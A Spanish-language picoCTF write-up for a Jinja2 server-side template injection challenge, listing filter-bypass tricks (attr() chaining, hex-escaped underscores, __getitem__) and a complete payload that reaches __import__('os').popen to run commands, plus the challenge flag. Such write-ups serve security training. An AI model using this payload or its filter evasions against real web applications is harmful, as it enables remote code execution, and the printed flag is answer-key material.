### Descripción

¡Hice un sitio web genial donde puedes anunciar lo que quieras! Leí sobre la desinfección de entradas, así que ahora elimino cualquier tipo de caracteres que puedan ser un problema :)¡Escuché que las plantillas son una forma genial y modular de crear aplicaciones web! ¡Echa un vistazo a mi sitio web [aquí](http://shape-facility.picoctf.net:56052/)!
### Solución

Ahora el sitio web se ha vuelto seguro a partir de simples cargas útiles y necesitamos eludir su protección. Uso de diferentes símbolos y nuevos comandos.

# **Técnicas clave de derivación**

1. Evitar la notación de puntos ('.') → utiliza '|attr()' para acceder dinámicamente a los atributos:  
  
request|attr('application')|attr("__globals__")  
  
— Omite los WAF que bloquean 'request.application.__globals__'.

> 2. Codificación hexadecimal ('\x5f') para guiones ('_')  
>   
> bajos "\x5f\x5fglobals\x5f\x5f"  
>   
> — Omite los filtros que bloquean '__globals__', '__builtins__' y '__import__'.
> 
> 3. Usando '__getitem__()' en lugar de '[]'  
> jinja2  
> |attr('__getitem__')('__builtins__')  
>   
> — Evade las protecciones que bloquean '__builtins__['__import__']'.

4. Jinja2 Sandbox Escape  
: accede a 'request.application.__globals__' para obtener las funciones integradas de Python.

> 5. RCE sin 'eval()' o 'exec()'  
>   
> __import__('os').popen('id').read()  
>   
> — Evita los bloqueos 'os.system()' y 'subprocess. Popen()'.

**Nuestra carga útil final:**

> {{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')("\x5f\x5fimport\x5f\x5f")('os')|attr('popen')('cat flag')|attr('read')()}}

### Bandera
picoCTF{sst1_f1lt3r_byp4ss_8b534b82}